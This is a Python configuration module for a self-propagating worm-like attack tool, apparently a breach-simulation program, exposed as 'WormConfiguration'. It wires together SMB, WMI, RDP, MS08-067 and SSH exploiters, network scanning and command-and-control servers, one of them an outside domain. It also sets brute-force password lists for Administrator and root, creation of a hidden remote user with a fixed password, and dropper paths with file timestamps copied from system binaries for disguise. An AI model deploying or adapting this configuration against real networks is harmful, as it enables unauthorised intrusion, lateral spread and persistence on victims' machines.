import os
import sys
from network.range import FixedRange, RelativeRange, ClassCRange
from exploit import WmiExploiter, Ms08_067_Exploiter, SmbExploiter, RdpExploiter, SSHExploiter
from network import TcpScanner, PingScanner, SMBFinger, SSHFinger
from abc import ABCMeta
import uuid
import types

__author__ = 'itamar'

GUID = str(uuid.getnode())

EXTERNAL_CONFIG_FILE = os.path.join(os.path.dirname(sys.argv[0]), 'monkey.bin')


def _cast_by_example(value, example):
    example_type = type(example)
    if example_type is str:
        return str(os.path.expandvars(value))
    elif example_type is tuple and len(example) != 0:
        return tuple([_cast_by_example(x, example[0]) for x in value])
    elif example_type is list and len(example) != 0:
        return [_cast_by_example(x, example[0]) for x in value]
    elif example_type is type(value):
        return value
    elif example_type is bool:
        return value.lower() == 'true'
    elif example_type is int:
        return int(value)
    elif example_type is float:
        return float(value)
    elif example_type is types.ClassType or example_type is ABCMeta:
        return globals()[value]
    else:
        return None


class Configuration(object):

    def from_dict(self, data):
        for key, value in data.items():
            if key.startswith('_'):
                continue

            try:
                default_value = getattr(Configuration, key)
            except AttributeError:
                raise
            
            setattr(self, key, _cast_by_example(value, default_value))

    def as_dict(self):
        result = {}
        for key in dir(Configuration):
            if key.startswith('_'):
                continue
            try:
                value = getattr(self, key)
            except AttributeError:
                continue

            val_type = type(value)

            if val_type is types.FunctionType or val_type is types.MethodType:
                continue

            if val_type is types.ClassType or val_type is ABCMeta:
                value = value.__name__
            elif val_type is tuple or val_type is list:
                if len(value) != 0 and type(value[0]) is types.ClassType or type(value[0]) is ABCMeta:
                    value = val_type([x.__name__ for x in value])

            result[key] = value

        return result

    ###########################
    # logging config
    ###########################

    use_file_logging = True
    dropper_log_path = os.path.expandvars("%temp%\~df1562.tmp") if sys.platform == "win32" else '/tmp/user-1562'
    monkey_log_path = os.path.expandvars("%temp%\~df1563.tmp") if sys.platform == "win32" else '/tmp/user-1563'

    ###########################
    # dropper config
    ###########################

    dropper_try_move_first = sys.argv[0].endswith(".exe")
    dropper_set_date = True
    dropper_date_reference_path = r"\windows\system32\kernel32.dll" if sys.platform == "win32" else '/bin/sh'
    dropper_target_path = r"C:\Windows\monkey.exe"
    dropper_target_path_linux = '/bin/monkey'

    ###########################
    # monkey config
    ###########################

    alive = True

    self_delete_in_cleanup = False

    singleton_mutex_name = "{2384ec59-0df8-4ab9-918c-843740924a28}"

    # how long to wait between scan iterations
    timeout_between_iterations = 300

    # how many scan iterations to perform on each run
    max_iterations = 3

    scanner_class = TcpScanner
    finger_classes = (SMBFinger, SSHFinger, PingScanner)
    exploiter_classes = (SmbExploiter, WmiExploiter, RdpExploiter, Ms08_067_Exploiter, SSHExploiter)

    # how many victims to look for in a single scan iteration
    victims_max_find = 14

    # how many victims to exploit before stopping
    victims_max_exploit = 7

    current_server = ""

    command_servers = [
        "russian-mail-brides.com:5000",
        "127.0.0.1:5000"
    ]

    serialize_config = False

    retry_failed_explotation = True

    ###########################
    # scanners config
    ###########################

    range_class = RelativeRange
    range_size = 30
    # range_class = FixedRange
    range_fixed = ("", )

    # TCP Scanner
    tcp_target_ports = [22, 2222, 445, 135, 3389]
    tcp_scan_timeout = 3000  # 3000 Milliseconds
    tcp_scan_interval = 200
    tcp_scan_get_banner = True

    # Ping Scanner
    ping_scan_timeout = 1000

    ###########################
    # exploiters config
    ###########################

    skip_exploit_if_file_exist = True

    ms08_067_exploit_attempts = 5
    ms08_067_remote_user_add = "IUSER_SUPPORT"
    ms08_067_remote_user_pass = "Password1!"

    # psexec exploiter
    psexec_user = "Administrator"
    psexec_passwords = ["Password1!", "1234", "password", "12345678"]

    # ssh exploiter
    ssh_user = "root"
    ssh_passwords = ["Password1!", "1234", "password", "12345678"]

    # rdp exploiter
    rdp_use_vbs_download = True

    # system info collection
    collect_system_info = True

WormConfiguration = Configuration()
